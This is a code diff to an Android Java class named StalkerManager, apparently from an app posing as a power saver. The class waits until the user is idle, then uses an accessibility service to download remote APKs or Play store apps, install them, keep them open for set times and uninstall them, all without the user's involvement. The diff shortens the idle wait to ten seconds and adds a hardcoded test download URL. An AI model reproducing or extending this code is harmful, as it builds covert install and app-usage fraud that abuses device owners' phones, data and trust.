@@ -1,8 +1,7 @@
 package com.luna.powersaver.gp.manager;
 
-import android.content.Context;
 import android.os.Handler;
-import android.os.PowerManager;
+import android.os.Looper;
 import android.support.annotation.Nullable;
 import android.text.TextUtils;
 
@@ -13,17 +12,16 @@ import com.luna.powersaver.gp.http.bean.DownloadInfo;
 import com.luna.powersaver.gp.service.NBAccessibilityService;
 import com.luna.powersaver.gp.utils.AppDebugLog;
 import com.luna.powersaver.gp.utils.AppUtil;
-import com.luna.powersaver.gp.utils.DBUtil;
 import com.luna.powersaver.gp.utils.FileUtil;
 import com.luna.powersaver.gp.utils.JsonUtil;
 import com.luna.powersaver.gp.utils.NetworkUtil;
+
+import org.json.JSONArray;
 
 import java.io.File;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Iterator;
-
-import static com.luna.powersaver.gp.service.NBAccessibilityService.sCurrentWorkType;
 
 /**
  * 为了操作方便，暂时实行同一时间一个任务 <br />
@@ -47,11 +45,12 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
     /**
      * 默认监测用户无操作间隔，5分钟，单位 ms
      */
-    private static final int DEFAULT_SPY_DIFF_TIME = 5 * 60 * 1000;
+    private static final int DEFAULT_SPY_DIFF_TIME = 10 * 1000;
     /**
      * 默认至少需要打开的时间，单位 s
      */
     private static final int DEFAULT_OPEN_TIME = 5 * 60;
+    private boolean mIsInSpying = false;
     /**
      * 当前正在执行的任务
      */
@@ -59,6 +58,49 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
     // 全部任务列表
     private HashMap<String, JsonAppInfo> mTotalMap = null;
     private ArrayList<JsonAppInfo> mWaitingList = null;
+
+    public void test() {
+//        DownloadInfo info = new DownloadInfo();
+//        info.setDestUrl("http://static.amigo.ws/apk/release_241.apk");
+//        info.setDownloadUrl("http://static.amigo.ws/apk/release_241.apk");
+//        info.setPackageName("luna.net.shortfilm.gp");
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加测试成功!");
+        JsonAppInfo i = new JsonAppInfo();
+        i.execstate = JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD;
+        i.start = 1;
+        i.uri = "intent:#Intent;action=andrid.intent.action.SHELL_CORE_SERVICE;package=luna.net.shortfilm.gp;end";
+        i.url = "http://static.amigo.ws/apk/release_241.apk";
+        i.task = JsonAppInfo.TASK.DOWNLOAD_BY_APK;
+        i.pkg = "luna.net.shortfilm.gp";
+        i.starttime = System.currentTimeMillis() / 1000 - 10;
+        i.endtime = System.currentTimeMillis() / 1000 + 30 * 60;
+        i.keepstate = JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN;
+        ArrayList<JsonAppInfo> is = new ArrayList<>();
+        is.add(i);
+        addNewTask(is);
+
+    }
+
+    private void printJsonAppInfo(JsonAppInfo info) {
+        AppDebugLog.d(AppDebugLog.TAG_PRINT, "当前执行的任务: " + JsonUtil.convertJsonAppInfoToJson(info));
+    }
+
+    private void printJsonAppInfoMap(HashMap<String, JsonAppInfo> map) {
+        AppDebugLog.d(AppDebugLog.TAG_PRINT, "当前总的任务：" + JsonUtil.convertJsonAppInfoMapToJson(map));
+    }
+
+    private void printJsonAppInfoList(ArrayList<JsonAppInfo> list) {
+        if (list != null) {
+            JSONArray jsonArray = new JSONArray();
+            for (JsonAppInfo entry : list) {
+                jsonArray.put(JsonUtil.convertJsonAppInfoToJObj(entry));
+            }
+            AppDebugLog.d(AppDebugLog.TAG_PRINT, "待执行任务列表：" + jsonArray.toString());
+
+        } else {
+            AppDebugLog.d(AppDebugLog.TAG_PRINT, "list is null");
+        }
+    }
 
     /**
      * 移除废除的任务，建议线程中执行
@@ -78,18 +120,14 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
 
             if (pCurrentWorkInfo != null && pCurrentWorkInfo.pkg.equals(pkg)) {
                 // 当前任务需要废除
-                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DISCARD;
+                pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.DISCARD;
                 pCurrentWorkInfo = null;
-                DBUtil.setWorkingInfo(null);
             }
-            // totalMap 跟 finishedSet 不废除，保留记录？
-            for (int i = mWaitingList.size(); i > 0; i--) {
-                tmp = mWaitingList.get(i);
-                if (tmp == null) {
-                    mWaitingList.remove(i);
-                } else if (pkg.equals(tmp.pkg)) {
-                    mWaitingList.remove(i);
-                    mTotalMap.remove(pkg);
+            Iterator<JsonAppInfo> it = mWaitingList.iterator();
+            while (it.hasNext()) {
+                tmp = it.next();
+                if (tmp != null && pkg.equals(tmp.pkg)) {
+                    it.remove();
                 }
             }
         }
@@ -105,31 +143,35 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
         }
         JsonAppInfo old;
         for (JsonAppInfo info : newpkgs) {
-            AppDebugLog.d(AppDebugLog.TAG_STALKER, "待判断第一个礼包：" + info);
             if (info == null)
                 continue;
             old = mTotalMap.get(info.pkg);
             if (old == null) {
+                AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加新的任务： " + info.pkg);
                 mWaitingList.add(info);
                 mTotalMap.put(info.pkg, info);
             } else {
-                if (old.execState != JsonAppInfo.EXC_STATE.FINISHED
-                        || (old.endtime < info.starttime)) {
+                if ((old.execstate != JsonAppInfo.EXC_STATE.FINISHED
+                        && old.execstate != JsonAppInfo.EXC_STATE.DISCARD)
+                        || (old.starttime < info.starttime)) {
+                    AppDebugLog.d(AppDebugLog.TAG_STALKER, "重置旧的任务：" + info.pkg);
                     // 任务没完成或者需要重置
                     old.starttime = info.starttime;
                     old.endtime = info.endtime;
                     old.task = info.task;
-                    if (old.execState != JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD) {
-                        mWaitingList.add(old);
+                    old.execstate = JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD;
+                    for (JsonAppInfo tp : mWaitingList) {
+                        if (tp.pkg.equals(old.pkg)) {
+                            return;
+                        }
                     }
-                    old.execState = JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD;
+                    mWaitingList.add(old);
                 }
             }
         }
-        AppDebugLog.d(AppDebugLog.TAG_STALKER, "添加结果： " + mTotalMap + "\n " + mWaitingList);
     }
 
-    private Handler mHandler = new Handler();
+    private Handler mHandler = new Handler(Looper.getMainLooper());
     private Runnable run = new Runnable() {
         @Override
         public void run() {
@@ -138,7 +180,7 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
             }
             if (NetworkUtil.isWifiConnected(StaticConst.sContext)) {
                 NBAccessibilityService.sIsInWork = true;
-                screenWakeup();
+//                screenWakeup();
                 doStart();
             } else {
                 stopSpyWork();
@@ -150,17 +192,25 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
      * 开启监视弹窗，然后执行任务的过程
      */
     public void startSpyWork() {
+        if (mIsInSpying)
+            return;
         AppDebugLog.d(AppDebugLog.TAG_STALKER, "开始执行监视任务!");
-        mHandler.postDelayed(run, 10 * 1000);
+        mIsInSpying = true;
+        mHandler.removeCallbacks(run);
+        mHandler.postDelayed(run, DEFAULT_SPY_DIFF_TIME);
     }
 
 
     public void stopSpyWork() {
+        mIsInSpying = false;
         AppDebugLog.d(AppDebugLog.TAG_STALKER, "取消执行监视任务!");
-        screenLock();
+//        screenLock();
         mHandler.removeCallbacksAndMessages(run);
+        // 保存当前任务状态
+        StalkerManager.get().saveCurrentTask();
         mTotalMap = null;
         mWaitingList = null;
+        pCurrentWorkInfo = null;
         NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.CLEAR;
         ClockManager.get().stopOpenRecordAlarm(StaticConst.sContext);
     }
@@ -174,63 +224,36 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
             return;
         }
         NBAccessibilityService.sRetryTime = 0;
-        if (pCurrentWorkInfo != null) {
+
+        if (mTotalMap == null || mWaitingList == null)
+            restoreCurrentTask();
+
+        printJsonAppInfoList(mWaitingList);
+        if (pCurrentWorkInfo != null)
             // 确保一致
             pCurrentWorkInfo = mTotalMap.get(pCurrentWorkInfo.pkg);
-            if (pCurrentWorkInfo != null) {
-                switch (pCurrentWorkInfo.execState) {
-                    case JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD:
-                    case JsonAppInfo.EXC_STATE.DOWNLOADING:
-                    case JsonAppInfo.EXC_STATE.DOWNLOADED:
-                        if (AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
-                            // 已经安装了，转换状态
-                            doContinueAfterInstalled();
-                            return;
-                        }
-                        break;
-                    case JsonAppInfo.EXC_STATE.INSTALLED:
-                        if (AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
-                            doContinueAfterInstalled();
-                            return;
-                        }
-                        break;
-                    case JsonAppInfo.EXC_STATE.OPENED:
-                        if (AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
-                            doContinueAfterOpened();
-                            return;
-                        }
-                        break;
-                    case JsonAppInfo.EXC_STATE.FINISHED:
-                        if (AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
-                            pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
-                            pCurrentWorkInfo = null;
-                        }
-                        break;
-                }
-            }
-        }
 
-        if (pCurrentWorkInfo == null) {
+        if (pCurrentWorkInfo == null || pCurrentWorkInfo.execstate == JsonAppInfo.EXC_STATE.DISCARD
+                || pCurrentWorkInfo.execstate == JsonAppInfo.EXC_STATE.FINISHED) {
             // 处理 pCurrentWorkInfo
-            int i = mWaitingList.size() - 1;
             JsonAppInfo info = null;
-            if (i > -1) {
-                long curTime = System.currentTimeMillis() / 1000;
-
-                info = mWaitingList.get(i);
-                while (i > -1) {
-                    if (info == null) {
-                        mWaitingList.remove(i);
-                    } else if (curTime >= info.endtime) {
-                        // 已经超时，任务废弃
-                        mWaitingList.remove(i);
-                        info.execState = JsonAppInfo.EXC_STATE.DISCARD;
-                    } else if (curTime > info.starttime) {
-                        // 还没到可以执行的时候，跳过
-                        break;
-                    }
-                    info = mWaitingList.get(--i);
+            Iterator<JsonAppInfo> iterator = mWaitingList.iterator();
+            long curTime = System.currentTimeMillis() / 1000;
+            while (iterator.hasNext()) {
+                info = iterator.next();
+                if (info == null) {
+                    iterator.remove();
+                } else if (curTime >= info.endtime
+                        || info.execstate == JsonAppInfo.EXC_STATE.DISCARD
+                        || info.execstate == JsonAppInfo.EXC_STATE.FINISHED) {
+                    // 已经超时，任务废弃
+                    iterator.remove();
+                    info.execstate = JsonAppInfo.EXC_STATE.DISCARD;
+                } else if (curTime > info.starttime) {
+                    // 正常可执行任务
+                    break;
                 }
+                info = null;
             }
             if (info == null) {
                 // 没有任务或者没有合适的任务，此次执行提前结束
@@ -241,10 +264,42 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
 
             pCurrentWorkInfo = info;
         }
+
+        if (pCurrentWorkInfo.execstate != JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD
+                && AppUtil.isPkgInstalled(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
+            // 要进行的任务已经安装，所以直接修改状态
+            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.INSTALLED;
+        }
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "任务当前状态为：" + pCurrentWorkInfo.execstate);
+        printJsonAppInfo(pCurrentWorkInfo);
+        // 之前执行任务重启判断
+        switch (pCurrentWorkInfo.execstate) {
+            case JsonAppInfo.EXC_STATE.DOWNLOADED:
+                if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
+                    DownloadInfo info = new DownloadInfo();
+                    info.setPackageName(pCurrentWorkInfo.pkg);
+                    info.setDestUrl(pCurrentWorkInfo.url);
+                    info.setDownloadUrl(pCurrentWorkInfo.url);
+                    doContinueAfterDownloaded(info);
+                    return;
+                }
+                break;
+            case JsonAppInfo.EXC_STATE.INSTALLED:
+                doContinueAfterInstalled();
+                return;
+            case JsonAppInfo.EXC_STATE.OPENED:
+                doContinueAfterOpened();
+                return;
+            case JsonAppInfo.EXC_STATE.FINISHED:
+                AppDebugLog.d(AppDebugLog.TAG_STALKER, "当前任务已经完成，重新执行下一个任务!");
+                doNextStart();
+                return;
+        }
         AppDebugLog.d(AppDebugLog.TAG_STALKER, "执行当前任务，pCurrentWorkInfo = " + pCurrentWorkInfo.pkg);
 
-        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DOWNLOADING;
+        pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.DOWNLOADING;
         NBAccessibilityService.sCurrentWorkState = 0;
+        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
         if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
             // 开始下载
             DownloadInfo downloadInfo = new DownloadInfo();
@@ -253,10 +308,12 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
             downloadInfo.setPackageName(pCurrentWorkInfo.pkg);
             DownloadManager.getInstance(StaticConst.sContext).startDownload(downloadInfo);
             // 需要等下载完之后回调
-            sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
         } else if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_GP) {
-            sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
-            AppUtil.jumpToStore(StaticConst.sContext, pCurrentWorkInfo.pkg);
+            NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
+            if (!AppUtil.jumpToStore(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
+                // 上报由于不存在GP而失败
+                doNextStartAfterError(0, "GP没有安装失败");
+            }
         }
     }
 
@@ -265,9 +322,11 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
      */
     public void doContinueAfterUninstall() {
         // 卸载之后，则开始执行下一个任务
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterUninstall");
         NBAccessibilityService.sCurrentWorkState = 0;
+        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
         if (pCurrentWorkInfo != null) {
-            pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
+            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.FINISHED;
             pCurrentWorkInfo = null;
         }
         doStart();
@@ -277,12 +336,18 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
      * 当APP检测已经安装，执行该步骤
      */
     public void doContinueAfterInstalled() {
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterInstalled");
         if (pCurrentWorkInfo == null) {
             doStart();
             return;
         }
-        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.INSTALLED;
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterInstalled：当前状态 = " + pCurrentWorkInfo.execstate);
+//        if (pCurrentWorkInfo.execstate == JsonAppInfo.EXC_STATE.INSTALLED) {
+//            return;
+//        }
+        pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.INSTALLED;
         NBAccessibilityService.sCurrentWorkState = 0;
+        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
         switch (pCurrentWorkInfo.keepstate) {
             case JsonAppInfo.KEEP_STATE.NOT_WORK:
                 if (pCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
@@ -293,10 +358,10 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
                     // 删除可能存在的包，不做其他操作
                     DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                 }
-                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
+                doNextStart();
                 break;
             case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
-                sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
+                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                 if (NBAccessibilityService.sIsInWork) {
                     AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
                 }
@@ -304,12 +369,8 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
                 break;
             case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
             case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
-                sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
-                if (NBAccessibilityService.sIsInWork) {
-                    AppUtil.jumpToApp(StaticConst.sContext, pCurrentWorkInfo.pkg);
-                    // 开启后台计时服务
-                    ClockManager.get().startOpenRecordAlarm(StaticConst.sContext);
-                }
+                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
+                judgeOpen();
                 break;
         }
     }
@@ -318,12 +379,18 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
      * 处理APP打开过后的操作（根据累计时间继续打开或者下载完成等）
      */
     public void doContinueAfterOpened() {
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterOpened");
         if (pCurrentWorkInfo == null) {
             doStart();
             return;
         }
+//        if (pCurrentWorkInfo.execstate != JsonAppInfo.EXC_STATE.INSTALLED
+//                && pCurrentWorkInfo.execstate != JsonAppInfo.EXC_STATE.OPENED) {
+//            return;
+//        }
         ClockManager.get().stopOpenRecordAlarm(StaticConst.sContext);
-        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.OPENED;
+        pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.OPENED;
+        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
         NBAccessibilityService.sCurrentWorkState = 0;
         switch (pCurrentWorkInfo.keepstate) {
             case JsonAppInfo.KEEP_STATE.NOT_WORK:
@@ -336,33 +403,28 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
                     // 删除可能存在的包，不做其他操作
                     DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                 }
-                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
-                pCurrentWorkInfo = null;
-                doStart();
+                doNextStart();
                 break;
             case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                 // 一般该状态到不了这里
-                sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
+                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                 if (NBAccessibilityService.sIsInWork) {
                     AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
-                    pCurrentWorkInfo = null;
-                    doStart();
-                }
-                break;
-            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
-                if (isFinishedOpen()) {
-                    pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
-                    pCurrentWorkInfo = null;
-                    doStart();
-                } else {
-                    sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
-                    judgeOpen();
+                    doNextStart();
                 }
                 break;
             case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                 if (isFinishedOpen()) {
+                    doNextStart();
+                } else {
+                    NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
+                    judgeOpen();
+                }
+                break;
+            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
+                if (isFinishedOpen()) {
+                    NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                     AppUtil.uninstall(StaticConst.sContext, pCurrentWorkInfo.pkg);
-                    sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                 } else {
                     judgeOpen();
                 }
@@ -376,8 +438,14 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
     private void judgeOpen() {
         if (NBAccessibilityService.sIsInWork) {
             if (!AppUtil.isPkgForeground(StaticConst.sContext, pCurrentWorkInfo.pkg)) {
-                AppUtil.jumpToApp(StaticConst.sContext, pCurrentWorkInfo.pkg);
+                AppUtil.jumpToApp(StaticConst.sContext, pCurrentWorkInfo);
                 // 开启后台计时服务
+                if (pCurrentWorkInfo.start != 0) {
+                    pCurrentWorkInfo.opentime = DEFAULT_OPEN_TIME;
+                    doContinueAfterOpened();
+                } else {
+                    ClockManager.get().startOpenRecordAlarm(StaticConst.sContext);
+                }
             }
         }
     }
@@ -388,33 +456,58 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
      * @param info
      */
     public void doContinueAfterDownloaded(DownloadInfo info) {
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterDownloaded");
         if (pCurrentWorkInfo == null) {
             doStart();
             return;
         }
         NBAccessibilityService.sCurrentWorkState = 0;
+        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
         switch (pCurrentWorkInfo.keepstate) {
             case JsonAppInfo.KEEP_STATE.NOT_WORK:
                 // 删除包，然后不做其他操作
-                DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
-                pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
+//                DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
+                doNextStart();
                 break;
             case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                 // 安装后不打开立即卸载
             case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
             case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
+                AppDebugLog.d(AppDebugLog.TAG_STALKER, "判断执行安装操作!");
+                NBAccessibilityService.sCurrentWorkState = 0;
+                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.INSTALL_MANUALLY;
                 if (NBAccessibilityService.sIsInWork) {
                     AppUtil.install(StaticConst.sContext,
                             DownloadManager.getInstance(StaticConst.sContext).getDownloadFile(info));
                 }
-                sCurrentWorkType = NBAccessibilityService.TYPE.INSTALL_MANUALLY;
                 break;
         }
     }
 
     public void doContinueAfterSearch() {
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doContinueAfterSearch");
         NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
         NBAccessibilityService.sCurrentWorkState = 0;
+    }
+
+    public void doNextStart() {
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doNextStart");
+        if (pCurrentWorkInfo != null) {
+            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.FINISHED;
+        }
+        pCurrentWorkInfo = null;
+        saveCurrentTask();
+        doStart();
+    }
+
+    public void doNextStartAfterError(int code, String msg) {
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "doNextStartAfterError: " + msg);
+        if (pCurrentWorkInfo != null) {
+            pCurrentWorkInfo.execstate = JsonAppInfo.EXC_STATE.DISCARD;
+        }
+        pCurrentWorkInfo = null;
+        saveCurrentTask();
+        doStart();
     }
 
     @Override
@@ -424,15 +517,15 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
 
     @Override
     public void onFinishDownload(DownloadInfo info) {
-        pCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DOWNLOADED;
         doContinueAfterDownloaded(info);
     }
 
     @Override
     public void onFailDownload(DownloadInfo info, String err) {
-        // 下载失败，重置或者废弃？
+        // 下载失败，废弃
         AppDebugLog.d(AppDebugLog.TAG_STALKER, "下载失败: " + info.getPackageName() + ", url = "
                 + info.getDownloadUrl() + ", err = " + err);
+        doNextStartAfterError(0, "APK下载失败");
     }
 
     @Nullable
@@ -452,12 +545,13 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
      * 保存任务状态，建议在线程中执行
      */
     public void saveCurrentTask() {
-        if (mTotalMap == null)
+        if (mTotalMap == null || mWaitingList == null)
             return;
-
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "进行任务状态保护!");
         File storeDir = getOrMkStoreDir();
         if (storeDir == null) return;
         truncateTotalMap();
+        printJsonAppInfoMap(mTotalMap);
         String json = JsonUtil.convertJsonAppInfoMapToJson(mTotalMap);
         FileUtil.writeData(new File(storeDir, FILE_TOTAL_NAME), json);
         json = JsonUtil.convertJsonAppInfoToJson(pCurrentWorkInfo);
@@ -468,6 +562,7 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
      * 提取任务状态，建议在线程中执行
      */
     public void restoreCurrentTask() {
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "获取保存的任务状态!");
         File tmpFile = getOrMkStoreDir();
         if (tmpFile != null) {
             tmpFile = new File(tmpFile, FILE_TOTAL_NAME);
@@ -493,12 +588,15 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
                 pCurrentWorkInfo = mTotalMap.get(pCurrentWorkInfo.pkg);
             }
             for (JsonAppInfo info : mTotalMap.values()) {
-                if (info.execState != JsonAppInfo.EXC_STATE.FINISHED
-                        && info.execState != JsonAppInfo.EXC_STATE.DISCARD) {
+                if (info.execstate != JsonAppInfo.EXC_STATE.FINISHED
+                        && info.execstate != JsonAppInfo.EXC_STATE.DISCARD) {
                     mWaitingList.add(info);
                 }
             }
         }
+        printJsonAppInfo(pCurrentWorkInfo);
+        printJsonAppInfoMap(mTotalMap);
+        printJsonAppInfoList(mWaitingList);
     }
 
 
@@ -513,7 +611,7 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
             JsonAppInfo tmp;
             while (it.hasNext()) {
                 tmp = it.next();
-                if (tmp == null || tmp.execState == JsonAppInfo.EXC_STATE.DISCARD) {
+                if (tmp == null || tmp.execstate == JsonAppInfo.EXC_STATE.DISCARD) {
                     it.remove();
                     size--;
                 }
@@ -521,12 +619,12 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
                     break;
                 }
             }
-            if (size > 150) {
+            if (size > 200) {
                 it = mTotalMap.values().iterator();
                 long curTime = System.currentTimeMillis();
                 while (it.hasNext()) {
                     tmp = it.next();
-                    if (tmp == null || tmp.execState == JsonAppInfo.EXC_STATE.FINISHED
+                    if (tmp == null || tmp.execstate == JsonAppInfo.EXC_STATE.FINISHED
                             && tmp.endtime < curTime) {
                         it.remove();
                         size--;
@@ -540,10 +638,11 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
     }
 
     public boolean isFinishedOpen() {
-        return pCurrentWorkInfo != null && pCurrentWorkInfo.opentime > DEFAULT_OPEN_TIME;
+        return pCurrentWorkInfo != null && pCurrentWorkInfo.opentime >= DEFAULT_OPEN_TIME;
     }
 
     public void judgeClearList() {
+        AppDebugLog.d(AppDebugLog.TAG_STALKER, "执行清洁保存任务：" + NBAccessibilityService.sIsInWork);
         if (!NBAccessibilityService.sIsInWork) {
             StalkerManager.get().saveCurrentTask();
             pCurrentWorkInfo = null;
@@ -552,22 +651,22 @@ public class StalkerManager implements DownloadInfo.DownloadListener {
         }
     }
 
-
-    private PowerManager.WakeLock mWakeLock;
-
-    public void screenWakeup() {
-        if (mWakeLock == null) {
-            PowerManager pm = (PowerManager) StaticConst.sContext.getSystemService(Context.POWER_SERVICE);
-            mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "test");
-            mWakeLock.acquire();
-        }
-    }
-
-    public void screenLock() {
-        if (mWakeLock != null) {
-            mWakeLock.release();
-            mWakeLock = null;
-        }
-    }
+//
+//    private PowerManager.WakeLock mWakeLock;
+//
+//    public void screenWakeup() {
+//        if (mWakeLock == null) {
+//            PowerManager pm = (PowerManager) StaticConst.sContext.getSystemService(Context.POWER_SERVICE);
+//            mWakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "test");
+//            mWakeLock.acquire();
+//        }
+//    }
+//
+//    public void screenLock() {
+//        if (mWakeLock != null) {
+//            mWakeLock.release();
+//            mWakeLock = null;
+//        }
+//    }
 
 }
